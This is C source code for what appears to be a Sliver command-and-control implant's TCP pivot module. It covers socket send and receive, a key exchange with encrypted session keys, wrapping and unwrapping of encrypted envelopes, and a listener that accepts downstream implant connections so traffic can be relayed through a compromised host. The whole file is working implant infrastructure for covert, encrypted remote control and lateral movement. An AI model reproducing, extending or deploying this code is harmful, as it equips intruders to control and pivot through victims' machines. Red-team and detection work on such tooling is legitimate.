#include "pch.h"

BOOL SocketSend
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient,
	_In_ PBUFFER pBuffer
)
{
	BOOL Result = FALSE;
	DWORD dwNumberOfBytesSent = 0;
	DWORD dwTotal = 0;
	DWORD dwZeroTimeout = 0;
	PBYTE pTemp = NULL;
	DWORD cbTemp = 0;

	cbTemp = sizeof(DWORD) + pBuffer->cbBuffer;
	pTemp = ALLOC(cbTemp);
	memcpy(pTemp, &pBuffer->cbBuffer, sizeof(DWORD));
	memcpy(pTemp + sizeof(DWORD), pBuffer->pBuffer, pBuffer->cbBuffer);
	EnterCriticalSection(pSliverTcpClient->pLock);
	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
		goto CLEANUP;
	}

	while (dwTotal < cbTemp) {
		dwNumberOfBytesSent = send(pSliverTcpClient->Sock, &pTemp[dwTotal], cbTemp - dwTotal, 0);
		if (dwNumberOfBytesSent == SOCKET_ERROR) {
			LOG_ERROR("send", WSAGetLastError());
			goto CLEANUP;
		}

		dwTotal += dwNumberOfBytesSent;
	}

	Result = TRUE;
CLEANUP:
	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
		goto CLEANUP;
	}

	LeaveCriticalSection(pSliverTcpClient->pLock);
	FREE(pTemp);

	return Result;
}

PBUFFER SocketRecv
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	PBUFFER Result = NULL;
	DWORD dwNumberOfBytesRecv = 0;
	DWORD dwTotal = 0;
	DWORD dwZeroTimeout = 0;
	BOOL IsOk = FALSE;

	EnterCriticalSection(pSliverTcpClient->pLock);
	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
		goto CLEANUP;
	}

	Result = ALLOC(sizeof(BUFFER));
	dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->cbBuffer, sizeof(Result->cbBuffer), 0);
	if (dwNumberOfBytesRecv == SOCKET_ERROR || dwNumberOfBytesRecv != sizeof(Result->cbBuffer)) {
		LOG_ERROR("recv", WSAGetLastError());
		goto CLEANUP;
	}

	Result->pBuffer = ALLOC(Result->cbBuffer);
	while (dwTotal < Result->cbBuffer) {
		dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->pBuffer[dwTotal], Result->cbBuffer - dwTotal, 0);
		if (dwNumberOfBytesRecv == SOCKET_ERROR) {
			LOG_ERROR("recv", WSAGetLastError());
			goto CLEANUP;
		}

		dwTotal += dwNumberOfBytesRecv;
	}

	IsOk = TRUE;
CLEANUP:
	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
		goto CLEANUP;
	}

	LeaveCriticalSection(pSliverTcpClient->pLock);
	if (!IsOk) {
		FreeBuffer(Result);
		Result = NULL;
	}

	return Result;
}

PSLIVER_TCP_CLIENT TcpInit()
{
	PSLIVER_TCP_CLIENT pResult = NULL;
	CHAR szHost[] = "127.0.0.1";
	DWORD dwPort = 9898;
	DWORD dwReadDeadline = 10;
	DWORD dwWriteDeadline = 10;
	WSADATA WsaData;
	int ErrorCode = 0;
	BOOL Result = FALSE;
	BOOL IsOk = FALSE;

	pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
	pResult->lpHost = DuplicateStrA(szHost, 0);
	pResult->dwReadDeadline = dwReadDeadline * 1000;
	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
	pResult->Sock = INVALID_SOCKET;
	pResult->dwPort = dwPort;

	SecureZeroMemory(&WsaData, sizeof(WsaData));
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		LOG_ERROR("WSAStartup", WSAGetLastError());
		goto CLEANUP;
	}

	pResult->Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (pResult->Sock == INVALID_SOCKET) {
		LOG_ERROR("socket", WSAGetLastError());
		goto CLEANUP;
	}

	pResult->pLock = ALLOC(sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(pResult->pLock);
	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		TcpCleanup(pResult);
		pResult = NULL;
	}

	return pResult;
}

BOOL TcpClose
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	if (pSliverTcpClient != NULL) {
		if (pSliverTcpClient->Sock != INVALID_SOCKET) {
			closesocket(pSliverTcpClient->Sock);
		}
	}

	return TRUE;
}

BOOL TcpCleanup
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	if (pSliverTcpClient != NULL) {
		FREE(pSliverTcpClient->lpHost);
		if (pSliverTcpClient->pLock != NULL) {
			DeleteCriticalSection(pSliverTcpClient->pLock);
			FREE(pSliverTcpClient->pLock);
		}

		FREE(pSliverTcpClient);
		WSACleanup();
	}

	return TRUE;
}

BOOL TcpStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	BOOL Result = FALSE;
	SOCKADDR_IN Addr;
	DWORD dwErrorCode = SOCKET_ERROR;
	PBUFFER pPivotHello = NULL;
	PBUFFER pPeerPublicKeyRaw = NULL;
	PPIVOT_HELLO RecvPivotHello = NULL;
	PBUFFER pPeerSessionKey = NULL;
	PPBElement MarshaledSessionKey = NULL;
	PBYTE pEncryptedSessionKey = NULL;
	DWORD cbEncryptedSessionKey = 0;
	PPBElement PivotServerKeyExchange[2];
	PPBElement pPivotServerKeyExchangeData = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
	PENVELOPE pEnvelope = NULL;
	PBUFFER pPivotServerKeyExchangeEnvelope = NULL;
	PBUFFER pCipherText = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PPBElement ServerKeyExResp[2];
	LPVOID* UnmarshaledData = NULL;
	DWORD i = 0;

	SecureZeroMemory(&Addr, sizeof(Addr));
	SecureZeroMemory(PivotServerKeyExchange, sizeof(PivotServerKeyExchange));
	SecureZeroMemory(ServerKeyExResp, sizeof(ServerKeyExResp));
	inet_pton(AF_INET, pSliverTcpClient->lpHost, &Addr.sin_addr.s_addr);
	Addr.sin_family = AF_INET;
	Addr.sin_port = htons(pSliverTcpClient->dwPort);

	if (connect(pSliverTcpClient->Sock, &Addr, sizeof(Addr))) {
		LOG_ERROR("connect", WSAGetLastError());
		goto CLEANUP;
	}

	pPivotHello = MarshalPivotHello(pConfig, NULL);
	PrintFormatA("pPivotHello:\n");
	HexDump(pPivotHello->pBuffer, pPivotHello->cbBuffer);
	if (!SocketSend(pSliverTcpClient, pPivotHello)) {
		goto CLEANUP;
	}

	pPeerPublicKeyRaw = SocketRecv(pSliverTcpClient);
	if (pPeerPublicKeyRaw == NULL) {
		goto CLEANUP;
	}

	RecvPivotHello = UnmarshalPivotHello(pPeerPublicKeyRaw);
	PrintFormatA("RecvPivotHello->pPublicKey: %s\n", RecvPivotHello->pPublicKey->pBuffer);
	PrintFormatA("RecvPivotHello->lpPublicKeySignature: %s\n", RecvPivotHello->lpPublicKeySignature);
	PrintFormatA("RecvPivotHello->pSessionKey:\n");
	HexDump(RecvPivotHello->pSessionKey->pBuffer, RecvPivotHello->pSessionKey->cbBuffer);
	pPeerSessionKey = AgeDecryptFromPeer(pConfig, RecvPivotHello->pPublicKey, RecvPivotHello->lpPublicKeySignature, RecvPivotHello->pSessionKey);
	if (pPeerSessionKey == NULL || pPeerSessionKey->cbBuffer != CHACHA20_KEY_SIZE) {
		goto CLEANUP;
	}

	PrintFormatA("pPeerSessionKey->pBuffer:\n");
	HexDump(pPeerSessionKey->pBuffer, pPeerSessionKey->cbBuffer);
	pConfig->pPeerSessionKey = pPeerSessionKey->pBuffer;
	pPeerSessionKey->pBuffer = NULL;

	// Server Key Exchange
	pConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	MarshaledSessionKey = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
	pEncryptedSessionKey = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, MarshaledSessionKey->pMarshaledData, MarshaledSessionKey->cbMarshaledData, &cbEncryptedSessionKey);
	PivotServerKeyExchange[0] = CreateVarIntElement(pConfig->uPeerID, 1);
	PivotServerKeyExchange[1] = CreateBytesElement(pEncryptedSessionKey, cbEncryptedSessionKey, 2);
	pPivotServerKeyExchangeData = CreateStructElement(PivotServerKeyExchange, _countof(PivotServerKeyExchange), 0);

	pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
	pPivotPeerEnvelope->cPivotPeers = 1;
	pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
	pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
	pPivotPeerEnvelope->PivotPeers[0]->uPeerID = pConfig->uPeerID;
	pPivotPeerEnvelope->PivotPeers[0]->lpName = DuplicateStrA(pConfig->szSliverName, 0);

	pPivotPeerEnvelope->uType = MsgPivotServerKeyExchange;
	pPivotPeerEnvelope->pData = BufferMove(pPivotServerKeyExchangeData->pMarshaledData, pPivotServerKeyExchangeData->cbMarshaledData);
	pPivotServerKeyExchangeData->pMarshaledData = NULL;

	pEnvelope = ALLOC(sizeof(ENVELOPE));
	pEnvelope->uType = MsgPivotPeerEnvelope;
	pEnvelope->pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
	pPivotServerKeyExchangeEnvelope = MarshalEnvelope(pEnvelope);

	pCipherText = SliverEncrypt(pConfig->pPeerSessionKey, pPivotServerKeyExchangeEnvelope);
	if (!SocketSend(pSliverTcpClient, pCipherText)) {
		goto CLEANUP;
	}

	pRecvEnvelope = TcpRecv(pConfig, pSliverTcpClient);
	if (pRecvEnvelope == NULL || pRecvEnvelope->uType != MsgPivotServerKeyExchange) {
		goto CLEANUP;
	}

	ServerKeyExResp[0] = ALLOC(sizeof(PBElement));
	ServerKeyExResp[0]->dwFieldIdx = 1;
	ServerKeyExResp[0]->Type = Varint;

	ServerKeyExResp[1] = ALLOC(sizeof(PBElement));
	ServerKeyExResp[1]->dwFieldIdx = 2;
	ServerKeyExResp[1]->Type = Bytes;

	UnmarshaledData = UnmarshalStruct(ServerKeyExResp, _countof(ServerKeyExResp), pRecvEnvelope->pData->pBuffer, pRecvEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	memcpy(pConfig->PivotSessionID, ((PBUFFER)UnmarshaledData[1])->pBuffer, sizeof(pConfig->PivotSessionID));
	Result = TRUE;
CLEANUP:
	FreeBuffer(pPivotHello);
	FreeBuffer(pPeerSessionKey);
	FreeBuffer(pPeerPublicKeyRaw);
	FreePivotHello(RecvPivotHello);
	FreeElement(MarshaledSessionKey);
	FreeElement(pPivotServerKeyExchangeData);
	FreeEnvelope(pEnvelope);
	FreeBuffer(pPivotServerKeyExchangeEnvelope);
	FreeBuffer(pCipherText);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);
	FreeEnvelope(pRecvEnvelope);
	FREE(pEncryptedSessionKey);
	for (i = 0; i < _countof(ServerKeyExResp); i++) {
		FREE(ServerKeyExResp[i]);
	}

	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[1]);
		FREE(UnmarshaledData);
	}
	

	return Result;
}

PENVELOPE TcpRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_TCP_CLIENT pTcpClient
)
{
	PENVELOPE pResult = NULL;
	PBUFFER pCipherText = NULL;
	PBUFFER pData = NULL;
	PBUFFER pPlainText = NULL;
	PENVELOPE pIncomingEnvelope = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;

	pCipherText = SocketRecv(pTcpClient);
	pData = SliverDecrypt(pConfig, pCipherText, FALSE);
	if (pData == NULL) {
		goto CLEANUP;
	}

	pIncomingEnvelope = UnmarshalEnvelope(pData);
	if (pIncomingEnvelope->uType == MsgPivotPeerPing) {
		pResult = pIncomingEnvelope;
		pIncomingEnvelope = NULL;
		goto CLEANUP;
	}

	if (pIncomingEnvelope->uType != MsgPivotPeerEnvelope) {
		goto CLEANUP;
	}

	pPivotPeerEnvelope = UnmarshalPivotPeerEnvelope(pIncomingEnvelope->pData);
	if (pPivotPeerEnvelope == NULL) {
		goto CLEANUP;
	}

	if (pPivotPeerEnvelope->cPivotPeers < 1) {
		goto CLEANUP;
	}

	if (pPivotPeerEnvelope->PivotPeers[0]->uPeerID != pConfig->uPeerID) {
		pResult = pIncomingEnvelope;
		pIncomingEnvelope = NULL;
		goto CLEANUP;
	}

	pPlainText = SliverDecrypt(pConfig, pPivotPeerEnvelope->pData, TRUE);
	if (pPlainText == NULL) {
		goto CLEANUP;
	}

	pResult = UnmarshalEnvelope(pPlainText);
CLEANUP:
	FreeBuffer(pCipherText);
	FreeBuffer(pData);
	FreeBuffer(pPlainText);
	FreeEnvelope(pIncomingEnvelope);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);

	return pResult;
}

BOOL TcpSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_TCP_CLIENT pTcpClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pPlainText = NULL;
	BOOL Result = FALSE;
	PBUFFER pPeerPlainText = NULL;
	PBUFFER pPeerCiphertext = NULL;
	PBUFFER pCipherText = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
	ENVELOPE FinalEnvelope;

	pPlainText = MarshalEnvelope(pEnvelope);
	if (pEnvelope->uType != MsgPivotPeerPing && pEnvelope->uType != MsgPivotPeerEnvelope) {
		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
		pPivotPeerEnvelope->uType = MsgPivotSessionEnvelope;
		pPivotPeerEnvelope->pPivotSessionID = BufferInit(pConfig->PivotSessionID, sizeof(pConfig->PivotSessionID));
		pPivotPeerEnvelope->pData = SliverEncrypt(pConfig->pSessionKey, pPlainText);
		pPivotPeerEnvelope->cPivotPeers = 1;
		pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
		pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
		pPivotPeerEnvelope->PivotPeers[0]->uPeerID = pConfig->uPeerID;
		pPivotPeerEnvelope->PivotPeers[0]->lpName = DuplicateStrA(pConfig->szSliverName, 0);

		SecureZeroMemory(&FinalEnvelope, sizeof(FinalEnvelope));
		FinalEnvelope.uType = MsgPivotPeerEnvelope;
		FinalEnvelope.pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
		pPeerPlainText = MarshalEnvelope(&FinalEnvelope);
		FreeBuffer(FinalEnvelope.pData);


	}
	else {
		pPeerPlainText = pPlainText;
		pPlainText = NULL;
	}

	pPeerCiphertext = SliverEncrypt(pConfig->pPeerSessionKey, pPeerPlainText);
	if (!SocketSend(pTcpClient, pPeerCiphertext)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeBuffer(pPlainText);
	FreeBuffer(pPeerPlainText);
	FreeBuffer(pPeerCiphertext);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);

	return Result;
}

PPIVOT_CONNECTION TcpAccept
(
	_In_ PPIVOT_LISTENER pListener
)
{
	SOCKET Sock = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;
	PPIVOT_CONNECTION pResult = NULL;
	PSLIVER_TCP_CLIENT pTcpClient = NULL;

	Sock = (SOCKET)pListener->ListenHandle;
	ClientSocket = accept(Sock, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(PIVOT_CONNECTION));
	/*pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
	pResult->lpHost = DuplicateStrA(szHost, 0);
	pResult->dwReadDeadline = dwReadDeadline * 1000;
	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
	pResult->Sock = INVALID_SOCKET;
	pResult->dwPort = dwPort;*/
	pTcpClient = ALLOC(sizeof(SLIVER_TCP_CLIENT));
	pTcpClient->dwReadDeadline = 10;
	pTcpClient->dwWriteDeadline = 10;
	pTcpClient->Sock = ClientSocket;
	pTcpClient->pLock = ALLOC(sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(pTcpClient->pLock);
	pResult->lpDownstreamConn = pTcpClient;
	pResult->pListener = pListener;
CLEANUP:
	return pResult;
}

PPIVOT_LISTENER CreateTCPPivotListener
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ LPVOID lpClient,
	_In_ LPSTR lpBindAddress
)
{
	PPIVOT_LISTENER pListener = NULL;
	IN_ADDR InAddr;
	IN6_ADDR In6Addr;
	BOOL UseIpv4 = TRUE;
	NTSTATUS Status = STATUS_SUCCESS;
	SOCKADDR_IN SockAddr;
	SOCKADDR_IN6_LH SockAddr6;
	ULONG uScopeId = 0;
	USHORT uPort = 0;
	SOCKET Sock = INVALID_SOCKET;
	ULONG IoBlock = 0;
	DWORD dwErrorCode = 0;
	BOOL IsOk = FALSE;
	WSADATA WsaData;

	SecureZeroMemory(&WsaData, sizeof(WsaData));
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		goto CLEANUP;
	}

	SecureZeroMemory(&InAddr, sizeof(InAddr));
	SecureZeroMemory(&In6Addr, sizeof(In6Addr));
	SecureZeroMemory(&SockAddr, sizeof(SockAddr));
	SecureZeroMemory(&SockAddr6, sizeof(SockAddr6));
	Status = RtlIpv6StringToAddressExA(lpBindAddress, &In6Addr, &uScopeId, &uPort);
	if (Status == STATUS_SUCCESS) {
		memcpy(&SockAddr6.sin6_addr, &In6Addr, sizeof(In6Addr));
		SockAddr6.sin6_port = uPort;
		SockAddr6.sin6_family = AF_INET6;
		SockAddr6.sin6_scope_id = uScopeId;
		UseIpv4 = FALSE;
	}
	else {
		Status = RtlIpv4StringToAddressExA(lpBindAddress, TRUE, &InAddr, &uPort);
		if (Status == STATUS_SUCCESS) {
			SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
			SockAddr.sin_port = uPort;
			SockAddr.sin_family = AF_INET;
		}
		else {
			LOG_ERROR("RtlIpv6StringToAddressExA", Status);
			goto CLEANUP;
		}
	}

	if (UseIpv4) {
		Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}
	else {
		Sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
	}

	if (Sock == INVALID_SOCKET) {
		LOG_ERROR("socket", WSAGetLastError());
		goto CLEANUP;
	}

	if (ioctlsocket(Sock, FIONBIO, &IoBlock) != NO_ERROR) {
		LOG_ERROR("ioctlsocket", WSAGetLastError());
		goto CLEANUP;
	}

	if (UseIpv4) {
		dwErrorCode = bind(Sock, &SockAddr, sizeof(SockAddr));
	}
	else {
		dwErrorCode = bind(Sock, &SockAddr6, sizeof(SockAddr6));
	}

	if (dwErrorCode != NO_ERROR) {
		LOG_ERROR("bind", WSAGetLastError());
		goto CLEANUP;
	}

	if (listen(Sock, SOMAXCONN) != NO_ERROR) {
		LOG_ERROR("listen", WSAGetLastError());
		goto CLEANUP;
	}

	IsOk = TRUE;
	pListener = ALLOC(sizeof(PIVOT_LISTENER));
	pListener->ListenHandle = Sock;
	pListener->lpBindAddress = DuplicateStrA(lpBindAddress, 0);
	pListener->dwType = PivotType_TCP;
	pListener->dwListenerId = pConfig->dwListenerID++;
	pListener->pConfig = pConfig;
	pListener->lpUpstream = lpClient;

	pListener->RawSend = SocketSend;
	pListener->RawRecv = SocketRecv;
	pListener->Accept = TcpAccept;
	pListener->Close = TcpClose;
	pListener->Cleanup = TcpCleanup;
	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pListener, 0, NULL) == NULL) {
		LOG_ERROR("CreateThread", GetLastError());
		goto CLEANUP;
	}

CLEANUP:
	if (!IsOk && Sock != 0) {
		closesocket(Sock);
		WSACleanup();
	}

	return pListener;
}